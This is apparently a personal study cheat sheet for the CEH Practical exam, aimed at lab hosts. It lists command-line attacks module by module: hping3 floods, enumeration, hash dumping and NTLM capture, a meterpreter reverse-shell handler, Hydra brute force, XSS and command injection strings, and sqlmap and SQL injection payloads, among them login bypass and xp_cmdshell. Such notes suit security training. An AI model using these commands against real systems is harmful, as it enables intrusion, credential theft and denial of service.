# MY CEH Practical Note

## Tool Ref.
- nmap : https://www.stationx.net/nmap-cheat-sheet/ 
- Hping DDOS: https://linuxhint.com/hping3/ 
- Hydra : https://github.com/frizb/Hydra-Cheatsheet 
- sqlmap : https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d 
- msfvenom : https://securityonline.info/msfvenom-payload-list/ 
- WindowsCommand : 
https://www.thomas-krenn.com/en/wiki/Cmd_commands_under_Windows 
https://www.lifewire.com/net-user-command-2618097 

## fileShare/download 

### Share 

- python : python -m SimpleHTTPServer 80
- python: python -m pyftpdlib 21 #attackerip
- apache server :  
service apache2 start  
cd /var/www/html

### Download/Access 

- certutil.exe --urlcache -f  #http://fileurl
- wget #http://fileurl
- access windows smb on linux : smb://windowsip




## Module 01 : Cryptography 

Hash : MD5 
Encrepted Disk : VeraCrypt 

Stegnography : 
image : use openStego  or  QuickStego 
NTFS streams :type ./calc.exe  > ./readme.txt:calc.exe 

## Module 03 : Enumeration / Scanning

ping www.moviescope.com –f –l 1500 -> Frame size
tracert www.moviescope.com -> Determining hop count

### IP Range 
Open gui enter the range 10.10.10.0 - 255

### Nmap

nmap  -T 4 -sV -sC  -p- 10.10.10.0/24

### Metasploit :
#### Enumeration using Metasploit :

msfdb init
service postgresql start
msfconsole
msf > db_status
nmap -Pn -sS -A -oX Test 10.10.10.0/24
db_import Test
hosts -> To show all available hosts in the subnet
db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine
services -> to get all available services in a subnet

####  SMB Version Enumeration using MSF
use scanner/smb/smb_version
set RHOSTS 10.10.10.8-16
set THREADS 100
run
hosts -> now exact os_flavor information has been updated

#### snmp enum using MSF 
use auxiliary/scanner/snmp/snmp_login

### Scanning Networks
- Port Scanning using Hping3:
hping3 --scan 1-3000 -S 10.10.10.10
--scan parameter defines the port range to scan and –S represents SYN flag.

- Pinging the target using HPing3:
hping3 -c 3 10.10.10.10
-c 3 means that we only want to send three packets to the target machine.

- UDP Packet Crafting
hping3 10.10.10.10 --udp --rand-source --data 500

- TCP SYN request
hping3 -S 10.10.10.10 -p 80 -c 5
-S will perform TCP SYN request on the target machine, -p will pass the traffic through which port is assigned, and -c is the count of the packets sent to the Target machine.

- HPing flood
hping3 10.10.10.10 --flood

### snmp-check
snmp-check #targetip

## Module 04 : Enumeration

### SNMP Enumeration (161) :
nmap –sU –p 161 10.10.10.12
nmap -sU -p 161 --script=snmp-brute 10.10.10.12

msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS and exploit
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS and exploit

### NetBIOS Enumeration (139) : 

nbtstat –A 10.10.10.16
net use
net use \10.10.10.16\e ““\user:””
net use \10.10.10.16\e ““/user:””
NetBIOS Enumerator

### Enum4Linux Wins Enumeration :

enum4linux -u martin -p apple -U 10.10.10.12 -> Users Enumeration
enum4linux -u martin -p apple -o 10.10.10.12 -> OS Enumeration
enum4linux -u martin -p apple -P 10.10.10.12 -> Password Policy Information
enum4linux -u martin -p apple -G 10.10.10.12 -> Groups Information
enum4linux -u martin -p apple -S 10.10.10.12 -> Share Policy Information (SMB Shares Enumeration

### Active Directory LDAP Enumeration
use ADExplorer

## Module 05 : Vulnerability Analysis 

- nikto -h http://www.goodshopping.com -Tuning 1 
- Nessus 

## Module 06 : System Hacking


### Rainbowtable crack using Winrtgen/RainbowCrack :
WINRTGEN : Create rainbow
RainbowCrack : Use rainbow

- Open **WINRTGEN** and add new table
- Select ntlm from Hash dropdown list.
- Set Min Len as 4, Max Len as 6 and Chain Count 4000000
- Select loweralpha from Charset dropdown list (it depends upon Password).
- rcrack_gui.exe to crack hash with rainbow table

### Hash dump with Pwdump7 and crack with ohpcrack :

- wmic useraccount get name,sid -**-> Get user acc names and SID**
- **PwDump7.exe** > c:\hashes.txt
- Replace boxes in hashes.txt with relevant usernames from step 1.
- Ophcrack.exe -> load -> PWDUMP File
- Tables -> Vista free -> select the table directory -> crack

### NTLM Hash crack :

- responder -I eth0 # trigger wrong smb path
- usr\share\responder\logs --> Responder log location
- john /usr/share/responder/logs/ntlm.txt

## MSF System Hack

##  Create payload get shell  
- create payload with msfvenom

- use multi/handler 
set payload windows/meterpreter/reverse_tcp # same to msfvenom 
options '# set options
run 

-  Execute payload on targetsystem

## privilege escalation 

1. getsystem # work maybe 
2. run post/multi/recon/local_exploit_suggester # session background and try local exploit

# run vnc 

## Module 08 : Sniffing


- Request Search: http.request.method == “POST” -> Wireshark filter for filtering HTTP POST request 

- Capture traffic from remote interface via wireshark
	Capture > Options > Manage Interfaces 
	Remote Interface > Add > Host &  Port (2002)
	Username & password > Start

## Module 13 : Hacking Web Servers
### FTP Bruteforce with Hydra
#### Hydra
hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11


## Module 14 : Hacking Web Applications

Wordpress
wpscan --url http://10.10.10.12:8080/CEH --enumerate u

WP password bruteforce
msfconsole
use auxiliary/scanner/http/wordpress_login_enum

XSS 
`<script> alert("toor") </script>'
RCE 
ping 127.0.0.1 | hostname | net user


## Module 15 : SQL Injection
browser>> Console >> document.cookie # get cookie 

### SQLMAP
-  Extract DBS
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs

- Extract Tables
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables

- Extract Columns
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns

- Dump Data
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump

- OS Shell to execute commands
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell

- Login bypass
blah' or 1=1 --

- Insert data into DB from login
blah';insert into login values ('john','apple123');

- Create database from login
blah';create database mydatabase;

- Execute cmd from login | DOS 
blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --


